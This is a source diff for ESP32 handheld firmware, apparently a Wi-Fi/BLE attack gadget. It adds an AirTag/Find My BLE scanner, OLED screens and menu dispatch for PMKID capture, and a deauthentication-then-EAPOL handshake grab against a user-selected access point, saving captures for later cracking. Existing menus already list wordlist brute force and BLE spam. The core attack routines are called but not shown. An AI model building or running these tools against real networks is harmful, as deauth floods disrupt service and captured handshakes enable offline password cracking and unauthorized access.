+    void onResult(BLEAdvertisedDevice dev) override {
+        if (!g_airtagActive) return;
+        if (!dev.haveManufacturerData()) return;
+        std::string m = dev.getManufacturerData();
+        if (m.size() < 4) return;
+        const uint8_t* b = (const uint8_t*)m.data();
+        // Apple Find My / Offline Finding broadcast
+        // b[0..1] = 0x4C 0x00 (Apple company ID, LE)
+        // b[2]    = 0x12       (Find My type)
+        // b[3]    = 0x19       (length 25)
+        if (!(b[0] == 0x4C && b[1] == 0x00 && b[2] == 0x12)) return;
+
+        const char* macStr = dev.getAddress().toString().c_str();
+        int slot = -1;
+        for (int i = 0; i < g_airtagCount; i++)
+            if (strcmp(g_airtags[i].addr, macStr) == 0) { slot = i; break; }
+        if (slot < 0 && g_airtagCount < MAX_AIRTAGS) slot = g_airtagCount++;
+        if (slot < 0) return;
+
+        AirtagEntry& e = g_airtags[slot];
+        strncpy(e.addr, macStr, 17); e.addr[17] = '\0';
+        e.rssi     = dev.getRSSI();
+        e.status   = (m.size() > 6) ? b[6] : 0;
+        e.lastSeen = millis();
+    }
+};
+static AirtagScanCB g_airtagScanCBInstance;
+
+void startAirtagScan() {
+    if (g_airtagActive) return;
+    if (g_bleScanActive) { logAdd("AirTag: BLE scan busy","WARN"); return; }
+    g_airtagCount  = 0;
+    g_airtagActive = true;
+    if (g_bleScan) {
+        g_bleScan->setAdvertisedDeviceCallbacks(&g_airtagScanCBInstance);
+        g_bleScan->setActiveScan(true);
+        g_bleScan->setInterval(100);
+        g_bleScan->setWindow(99);
+        // Continuous scan with 0 = forever; we stop manually
+        g_bleScan->start(0, nullptr, false);
+    }
+    logAdd("AirTag scan started","WARN");
+}
+
+void stopAirtagScan() {
+    if (!g_airtagActive) return;
+    g_airtagActive = false;
+    if (g_bleScan) {
+        g_bleScan->stop();
+        // Restore the normal BLE scan callback for the BLE Scan menu
+        g_bleScan->setAdvertisedDeviceCallbacks(&g_bleScanCBInstance);
+    }
+    logAdd("AirTag scan stopped ("+String(g_airtagCount)+" tags)");
 }
 
 // ─────────────────────────────────────────────────────────────
@@ -1551,6 +2069,122 @@ static void drawBrute() {
     oled.display();
 }
 
+// ── PMKID capture progress ───────────────────────────────────
+static void drawPMKID() {
+    oled.clearDisplay();
+    const char* status = g_pmkid.captured ? "GOT"  :
+                         g_pmkid.active   ? "RUN"  : "STOP";
+    oledHeader("PMKID Grab", status);
+    oled.setTextColor(WHITE); oled.setTextSize(1);
+
+    char buf[24];
+    snprintf(buf, sizeof(buf), "AP: %.16s", g_pmkid.ssid[0] ? g_pmkid.ssid : "(none)");
+    oled.setCursor(0, 14); oled.print(buf);
+
+    if (g_pmkid.captured) {
+        oled.setCursor(0, 26); oled.print("PMKID:");
+        char half1[17], half2[17];
+        strncpy(half1, g_pmkid.pmkidHex,      16); half1[16]='\0';
+        strncpy(half2, g_pmkid.pmkidHex + 16, 16); half2[16]='\0';
+        oled.setCursor(0, 38); oled.print(half1);
+        oled.setCursor(0, 48); oled.print(half2);
+        oledHint(">back   /captures/");
+    } else if (g_pmkid.active) {
+        uint32_t secs = (millis() - g_pmkid.startMs) / 1000;
+        snprintf(buf, sizeof(buf), "Waiting M1... %lus", (unsigned long)secs);
+        oled.setCursor(0, 26); oled.print(buf);
+        oled.setCursor(0, 38); oled.print("Listening EAPOL...");
+        oledHint(">back   hold=stop");
+    } else {
+        oled.setCursor(0, 26); oled.print("Idle — pick target");
+        oled.setCursor(0, 38); oled.print("from Scan list, *");
+        oledHint(">back   hold=start");
+    }
+    oled.display();
+}
+
+// ── Auto-Combo (Deauth → EAPOL handshake) ────────────────────
+static void drawCombo() {
+    oled.clearDisplay();
+    const char* status = g_combo.phase == 3 ? (g_combo.framesNow > 0 ? "OK" : "MISS") :
+                         g_combo.phase == 1 ? "DEAUTH" :
+                         g_combo.phase == 2 ? "LISTEN" : "IDLE";
+    oledHeader("Capture HS", status);
+    oled.setTextColor(WHITE); oled.setTextSize(1);
+
+    char buf[24];
+    snprintf(buf, sizeof(buf), "AP: %.16s", g_combo.ssid[0] ? g_combo.ssid : "(none)");
+    oled.setCursor(0, 14); oled.print(buf);
+
+    if (g_combo.phase == 1) {
+        uint32_t left = 3 - (millis() - g_combo.phaseStartMs) / 1000;
+        if (left > 3) left = 0;
+        snprintf(buf, sizeof(buf), "Deauth burst: %lus", (unsigned long)left);
+        oled.setCursor(0, 26); oled.print(buf);
+        oledHint(">back   hold=stop");
+    } else if (g_combo.phase == 2) {
+        uint32_t left = 20 - (millis() - g_combo.phaseStartMs) / 1000;
+        if (left > 20) left = 0;
+        snprintf(buf, sizeof(buf), "Listen: %lus left", (unsigned long)left);
+        oled.setCursor(0, 26); oled.print(buf);
+        snprintf(buf, sizeof(buf), "EAPOL frames: %d", g_combo.framesNow);
+        oled.setCursor(0, 38); oled.print(buf);
+        oledHint(">back   hold=stop");
+    } else if (g_combo.phase == 3) {
+        snprintf(buf, sizeof(buf), "Captured: %d", g_combo.framesNow);
+        oled.setCursor(0, 26); oled.print(buf);
+        oled.setCursor(0, 38);
+        oled.print(g_combo.framesNow > 0 ? "/captures/handshake" : "No handshake");
+        oledHint(">back   hold=restart");
+    } else {
+        oled.setCursor(0, 26); oled.print("Pick target with *");
+        oled.setCursor(0, 38); oled.print("then long-press here");
+        oledHint(">back   hold=start");
+    }
+    oled.display();
+}
+
+// ── AirTag / Find My scanner ─────────────────────────────────
+static void drawAirtag() {
+    oled.clearDisplay();
+    char hdr[12];
+    snprintf(hdr, sizeof(hdr), "%d found", g_airtagCount);
+    oledHeader("AirTag Hunt", g_airtagActive ? hdr : "STOP");
+    oled.setTextColor(WHITE); oled.setTextSize(1);
+
+    if (g_airtagCount == 0) {
+        oled.setCursor(0, 18); oled.print(g_airtagActive ? "Scanning Find My..." : "Idle");
+        oled.setCursor(0, 30); oled.print("Apple BLE adverts");
+        oled.setCursor(0, 42); oled.print("type 0x12 = Find My");
+        oledHint(g_airtagActive ? ">back  hold=stop" : ">back  hold=start");
+        oled.display();
+        return;
+    }
+
+    // Show the 4 most-recent (highest lastSeen)
+    int  idx[MAX_AIRTAGS];
+    for (int i = 0; i < g_airtagCount; i++) idx[i] = i;
+    // Simple sort by lastSeen descending
+    for (int i = 0; i < g_airtagCount - 1; i++)
+        for (int j = i + 1; j < g_airtagCount; j++)
+            if (g_airtags[idx[j]].lastSeen > g_airtags[idx[i]].lastSeen) {
+                int t = idx[i]; idx[i] = idx[j]; idx[j] = t;
+            }
+
+    int shown = g_airtagCount < 4 ? g_airtagCount : 4;
+    for (int i = 0; i < shown; i++) {
+        AirtagEntry& e = g_airtags[idx[i]];
+        char line[22];
+        // Truncate MAC to last 11 chars for fit + RSSI + status byte
+        snprintf(line, sizeof(line), "%s %ddBm s%02x",
+                 e.addr + 6, e.rssi, e.status);
+        oled.setCursor(0, 14 + i * 11);
+        oled.print(line);
+    }
+    oledHint(g_airtagActive ? ">back  hold=stop" : ">back  hold=start");
+    oled.display();
+}
+
 // ── BLE scanning splash ──────────────────────────────────────
 static void drawBLEScan() {
     oled.clearDisplay();
@@ -1697,6 +2331,9 @@ void refreshOLED() {
         case SCR_BEACON_COUNT: drawBeaconCount(); break;
         case SCR_PROBE:        drawProbe();       break;
         case SCR_BRUTE:        drawBrute();       break;
+        case SCR_PMKID:        drawPMKID();       break;
+        case SCR_COMBO:        drawCombo();       break;
+        case SCR_AIRTAG:       drawAirtag();      break;
         case SCR_BLE_SCAN:     drawBLEScan();     break;
         case SCR_BLE_LIST:     drawBLEList();     break;
         case SCR_BLE_SPAM:     drawBLESpam();     break;
@@ -1767,7 +2404,7 @@ static void handleShortPress() {
         break;
 
     case SCR_BLE_TARGET:
-        g_spamTarget = (SpamTarget)((g_spamTarget + 1) % 4);
+        g_spamTarget = (SpamTarget)((g_spamTarget + 1) % SPAM_TARGET_N);
         break;
 
     // ── WiFi tool screens → back to WiFi menu ────────────────
@@ -1776,12 +2413,15 @@ static void handleShortPress() {
     case SCR_BEACON:
     case SCR_PROBE:
     case SCR_BRUTE:
+    case SCR_PMKID:
+    case SCR_COMBO:
         g_screen = SCR_WIFI_MENU;
         break;
 
     // ── BLE tool screens → back to BLE menu ──────────────────
     case SCR_BLE_SCAN:
     case SCR_BLE_SPAM:
+    case SCR_AIRTAG:
         g_screen = SCR_BLE_MENU;
         break;
 
@@ -1852,10 +2492,39 @@ static void handleLongPress() {
                 }
                 break;
             }
-            case 3: g_screen = SCR_BEACON;       break;
-            case 4: g_screen = SCR_BEACON_COUNT; break;
-            case 5: g_screen = SCR_PROBE;        break;
-            case 6: g_screen = SCR_MAIN;         break;  // Back
+            case 3: {  // Capture HS — auto-combo deauth → EAPOL
+                g_screen = SCR_COMBO;
+                if (!g_combo.active) {
+                    int picked = -1;
+                    for (int i = 0; i < g_apCount; i++)
+                        if (g_aps[i].selected) { picked = i; break; }
+                    if (picked < 0)
+                        logAdd("Combo: no target selected (Scan → *)", "WARN");
+                    else
+                        startCombo(g_aps[picked].ssid, g_aps[picked].bssid,
+                                   g_aps[picked].channel);
+                }
+                break;
+            }
+            case 4: {  // PMKID Grab
+                g_screen = SCR_PMKID;
+                if (!g_pmkid.active) {
+                    int picked = -1;
+                    for (int i = 0; i < g_apCount; i++)
+                        if (g_aps[i].selected) { picked = i; break; }
+                    if (picked < 0)
+                        logAdd("PMKID: no target selected (Scan → *)", "WARN");
+                    else
+                        startPMKIDCapture(g_aps[picked].ssid,
+                                          g_aps[picked].bssid,
+                                          g_aps[picked].channel);
+                }
+                break;
+            }
+            case 5: g_screen = SCR_BEACON;       break;
+            case 6: g_screen = SCR_BEACON_COUNT; break;
+            case 7: g_screen = SCR_PROBE;        break;
+            case 8: g_screen = SCR_MAIN;         break;  // Back
         }
         break;
 
@@ -1870,9 +2539,13 @@ static void handleLongPress() {
                     }, "blescan_oled", 4096, nullptr, 3, nullptr, 0);
                 }
                 break;
-            case 1: g_screen = SCR_BLE_SPAM;   break;
-            case 2: g_screen = SCR_BLE_TARGET;  break;
-            case 3: g_screen = SCR_MAIN;        break;  // Back
+            case 1:  // AirTag Hunt
+                g_screen = SCR_AIRTAG;
+                if (!g_airtagActive) startAirtagScan();
+                break;
+            case 2: g_screen = SCR_BLE_SPAM;   break;
+            case 3: g_screen = SCR_BLE_TARGET;  break;
+            case 4: g_screen = SCR_MAIN;        break;  // Back
         }
         break;
 
@@ -1935,6 +2608,46 @@ static void handleLongPress() {
             else
                 startBruteForce(g_aps[picked].ssid, "/wordlist.txt", 4000);
         }
+        break;
+
+    // ── PMKID Capture: long-press toggles ───────────────────
+    case SCR_PMKID:
+        if (g_pmkid.active) {
+            stopPMKIDCapture();
+        } else {
+            int picked = -1;
+            for (int i = 0; i < g_apCount; i++)
+                if (g_aps[i].selected) { picked = i; break; }
+            if (picked < 0)
+                logAdd("PMKID: no target selected (Scan → *)", "WARN");
+            else
+                startPMKIDCapture(g_aps[picked].ssid,
+                                  g_aps[picked].bssid,
+                                  g_aps[picked].channel);
+        }
+        break;
+
+    // ── Auto-Combo: long-press toggles ───────────────────────
+    case SCR_COMBO:
+        if (g_combo.active) {
+            stopCombo();
+        } else {
+            int picked = -1;
+            for (int i = 0; i < g_apCount; i++)
+                if (g_aps[i].selected) { picked = i; break; }
+            if (picked < 0)
+                logAdd("Combo: no target selected (Scan → *)", "WARN");
+            else
+                startCombo(g_aps[picked].ssid,
+                           g_aps[picked].bssid,
+                           g_aps[picked].channel);
+        }
+        break;
+
+    // ── AirTag Hunt: long-press toggles scanning ─────────────
+    case SCR_AIRTAG:
+        if (g_airtagActive) stopAirtagScan();
+        else                startAirtagScan();
         break;
 
     // ── BLE spam: toggle ─────────────────────────────────────
